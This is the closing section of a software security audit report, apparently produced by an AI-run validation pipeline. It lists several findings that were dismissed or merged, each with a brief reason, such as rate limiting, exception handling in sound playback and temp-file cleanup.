- FUTURE-005 (UsagePoller scaling): Not a security finding; the poller handles multiple keys sequentially by design.
- FUTURE-006 (GitHub API rate limit): Update check runs once per day; rate limiting is not a realistic concern.
- CRYPTO-003 (Decrypted keys in memory): Merged into F-027.
- QUALITY-018 (Bare except-pass): Only two instances found (notifications.py:99,103), both in sound playback where swallowing exceptions is acceptable.
- QUALITY-019 (Git temp file leak): The temp index file is explicitly deleted in `git_checkpoints.py:56`.

---

*Report generated by FORTRESS Phase 3/4 validation pipeline.*
*Auditor: Claude Opus 4.6 (1M context)*
*Date: 2026-04-10*
